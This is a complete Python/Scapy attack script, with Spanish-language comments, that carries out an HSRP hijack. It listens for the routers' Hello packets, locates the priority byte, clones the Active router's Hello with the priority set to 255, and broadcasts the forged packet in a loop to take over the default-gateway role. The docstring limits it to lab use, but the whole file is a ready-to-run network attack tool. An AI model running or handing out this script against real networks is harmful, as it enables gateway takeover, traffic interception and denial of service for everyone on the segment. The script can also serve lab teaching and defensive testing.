#!/usr/bin/env python3
"""
hsrp_hijack_auto.py
--------------------------------------------------------
HSRP Hijack (auto-template) - Laboratorio de Seguridad de Redes.

Metodologia: en vez de forjar un paquete HSRP "a ciegas" (lo cual
requiere conocer el formato exacto de bytes que usa el dispositivo,
que puede variar segun el simulador), este script:

  1. Escucha el trafico HSRP real y detecta las IPs de los routers.
  2. Compara los Hellos de ambos routers byte a byte usando las
     prioridades ya conocidas (por 'show standby brief') como ancla,
     para localizar automaticamente el campo de prioridad.
  3. Clona el Hello real del router Active y solo modifica ese byte,
     preservando el resto del formato exacto que la red ya acepta.
  4. Reenvia el paquete forjado en loop.

USO EXCLUSIVO EN LABORATORIOS CONTROLADOS (Packet Tracer / GNS3 /
EVE-NG / topologia aislada).
--------------------------------------------------------
"""

from scapy.all import (
    Ether, IP, UDP, Raw, sendp, sniff, get_if_hwaddr, get_if_addr, conf
)
import sys

HSRP_PORT = 1985

# --- Colores ANSI (se ven bien en la terminal de Kali) ---
C = {
    "g": "\033[92m", "r": "\033[91m", "y": "\033[93m",
    "c": "\033[96m", "b": "\033[1m", "0": "\033[0m",
}


def ok(msg):   print(f"{C['g']}[+]{C['0']} {msg}")
def warn(msg): print(f"{C['y']}[!]{C['0']} {msg}")
def err(msg):  print(f"{C['r']}[x]{C['0']} {msg}")
def info(msg): print(f"{C['c']}[i]{C['0']} {msg}")


def ask_str(prompt, default=None):
    d = f" [{default}]" if default else ""
    v = input(f"{prompt}{d}: ").strip()
    return v if v else default


def ask_int(prompt, default=None, lo=None, hi=None):
    d = f" [{default}]" if default is not None else ""
    while True:
        v = input(f"{prompt}{d}: ").strip()
        if v == "" and default is not None:
            return default
        try:
            n = int(v)
            if (lo is not None and n < lo) or (hi is not None and n > hi):
                err(f"debe estar entre {lo} y {hi}")
                continue
            return n
        except ValueError:
            err("ingresa un numero valido")


def banner(txt):
    line = "─" * 50
    print(f"\n{C['b']}{C['c']}{line}\n {txt}\n{line}{C['0']}")


def find_priority_offset(pa, prio_a, pb, prio_b):
    n = min(len(pa), len(pb))
    return [i for i in range(n) if pa[i] == prio_a and pb[i] == prio_b]


def discover_routers(iface, timeout=20, n=2):
    ok(f"Escuchando HSRP en {iface} ({timeout}s)...")
    found = {}

    def on_pkt(pkt):
        if pkt.haslayer(UDP) and pkt.haslayer(IP) and pkt[UDP].dport == HSRP_PORT:
            src = pkt[IP].src
            if src not in found:
                found[src] = pkt
                print(f"    → {src}")

    def stop(pkt):
        on_pkt(pkt)
        return len(found) >= n

    try:
        sniff(iface=iface, filter="udp port 1985", stop_filter=stop, timeout=timeout)
    except PermissionError:
        err("permisos insuficientes, ejecuta con sudo")
        sys.exit(1)
    return found


def capture_targeted(iface, ip_a, ip_b, timeout=25):
    ok(f"Esperando Hellos de {ip_a} y {ip_b} ({timeout}s)...")
    found = {}

    def on_pkt(pkt):
        if pkt.haslayer(UDP) and pkt.haslayer(IP) and pkt[UDP].dport == HSRP_PORT:
            src = pkt[IP].src
            if src in (ip_a, ip_b) and src not in found:
                found[src] = pkt
                print(f"    → {src}")

    def stop(pkt):
        on_pkt(pkt)
        return len(found) >= 2

    try:
        sniff(iface=iface, filter="udp port 1985", stop_filter=stop, timeout=timeout)
    except PermissionError:
        err("permisos insuficientes, ejecuta con sudo")
        sys.exit(1)
    return found


def main():
    banner("HSRP HIJACK (auto-template)  ·  build 2026-08-15")

    print("Interfaces:", ", ".join(i.name for i in conf.ifaces.data.values()))
    iface = ask_str("Interfaz", "eth0")

    try:
        mac_local, ip_local = get_if_hwaddr(iface), get_if_addr(iface)
    except Exception as e:
        err(f"interfaz invalida: {e}")
        sys.exit(1)
    ok(f"{iface} → MAC {mac_local}  IP {ip_local}")

    fuentes = discover_routers(iface)

    if len(fuentes) >= 2:
        ips = list(fuentes.keys())
        for i, ip in enumerate(ips, 1):
            print(f"  [{i}] {ip}")
        idx = ask_int("¿Cual es el ACTIVE?", 1, 1, len(ips))
        ip_active = ips[idx - 1]
        ip_standby = [ip for ip in ips if ip != ip_active][0]
        ok(f"Active={ip_active}  Standby={ip_standby}")
    else:
        warn("no se detectaron 2 routers, ingresa las IPs manualmente")
        ip_active = ask_str("IP del ACTIVE", "10.13.67.2")
        ip_standby = ask_str("IP del STANDBY", "10.13.67.3")
        fuentes = {}

    info("las prioridades no se pueden leer del paquete, confirma con 'show standby brief':")
    prio_active = ask_int(f"Priority ACTIVE ({ip_active})", 110, 0, 255)
    prio_standby = ask_int(f"Priority STANDBY ({ip_standby})", 100, 0, 255)

    capturados = fuentes if ip_active in fuentes and ip_standby in fuentes \
        else capture_targeted(iface, ip_active, ip_standby)

    if ip_active not in capturados or ip_standby not in capturados:
        err("no se lograron capturar ambos Hellos, reintenta")
        sys.exit(1)

    pkt_active = capturados[ip_active]
    payload_a = bytes(pkt_active[UDP].payload)
    payload_b = bytes(capturados[ip_standby][UDP].payload)

    offsets = find_priority_offset(payload_a, prio_active, payload_b, prio_standby)
    if not offsets:
        err("no coincide ningun byte con esas prioridades, verifica los valores")
        sys.exit(1)

    offset = offsets[0] if len(offsets) == 1 else ask_int(
        f"Varios offsets candidatos {offsets}, cual usar", offsets[0], 0, len(payload_a) - 1
    )
    ok(f"Byte de prioridad → offset {offset}")

    nueva_prio = ask_int("Prioridad a forjar (255 = maxima)", 255, 0, 255)
    intervalo = ask_int("Intervalo (s)", 3, 1, None)

    nuevo_payload = bytearray(payload_a)
    nuevo_payload[offset] = nueva_prio

    dst_ip, dst_mac = pkt_active[IP].dst, pkt_active[Ether].dst

    banner("Resumen del ataque")
    print(f"  {'Interfaz':<18}: {iface}")
    print(f"  {'Atacante':<18}: {mac_local} / {ip_local}")
    print(f"  {'Destino':<18}: {dst_ip} ({dst_mac})")
    print(f"  {'Prioridad':<18}: {prio_active} → {C['b']}{nueva_prio}{C['0']}")
    print(f"  {'Intervalo':<18}: cada {intervalo}s\n")

    if ask_str("Confirmar (s/n)", "s").lower() != "s":
        warn("cancelado")
        sys.exit(0)

    pkt = (
        Ether(src=mac_local, dst=dst_mac) /
        IP(src=ip_local, dst=dst_ip, ttl=1) /
        UDP(sport=HSRP_PORT, dport=HSRP_PORT) /
        Raw(load=bytes(nuevo_payload))
    )

    ok(f"Enviando cada {intervalo}s… Ctrl+C para detener\n")
    try:
        sendp(pkt, iface=iface, inter=intervalo, loop=1, verbose=1)
    except KeyboardInterrupt:
        warn("\nataque detenido")
    except PermissionError:
        err("permisos insuficientes, ejecuta con sudo")
    except Exception as e:
        err(f"error al enviar: {e}")


if __name__ == "__main__":
    main()
      
